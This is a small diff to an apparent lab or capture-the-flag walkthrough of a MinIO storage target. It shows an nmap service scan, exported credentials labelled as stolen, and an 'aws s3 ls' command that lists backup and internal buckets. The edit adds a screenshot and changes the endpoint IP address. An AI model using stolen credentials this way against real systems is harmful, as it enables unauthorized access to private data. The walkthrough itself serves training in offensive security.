@@ -13,6 +13,9 @@ nmap -sV -p 9000,9001 11.0.2.20
 # 9001/tcp open MinIO Console
 ```
 
+<img width="2292" height="939" alt="image" src="https://github.com/user-attachments/assets/1a88677a-55a6-4b3d-822e-819247e57fb6" />
+
+
 ## Step 2 — List Buckets Using Stolen Credentials
 
 **Using AWS CLI:**
@@ -21,7 +24,7 @@ export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
 export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'
 export AWS_DEFAULT_REGION=us-east-1
 
-aws s3 ls --endpoint-url http://11.0.2.20:9000
+aws s3 ls --endpoint-url http://193.0.1.91:9000
 # Buckets:
 #   pul-cloud-backups
 #   pul-cloud-internal
